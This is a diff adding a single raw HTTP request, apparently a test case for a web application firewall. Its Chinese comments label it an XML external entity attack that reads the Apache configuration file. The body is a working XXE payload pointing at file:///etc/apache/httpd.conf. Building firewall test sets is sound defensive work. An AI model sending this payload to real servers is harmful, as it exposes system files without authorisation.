@@ -1,0 +1,15 @@
+# XML外部实体注入_文件读取_httpd.conf
+# 攻击者通过构造此语句利用file协议可以读取linux系统上web服务器配置文件httpd.conf
+POST /?bid=hd_tag_m8mv24mr HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv24mr
+RM-PRO-Token: 0233bfda2dca4f7f36741e12efcea60d
+RM-PRO-Time: 1742808393144
+User-Agent: curl/7.83.1
+Content-Type: application/xml
+
+<?xml version = "1.0"?>
+<!DOCTYPE ANY [
+<!ENTITY xxe SYSTEM "file:///etc/apache/httpd.conf">
+]>
+<x>&xxe;</x>
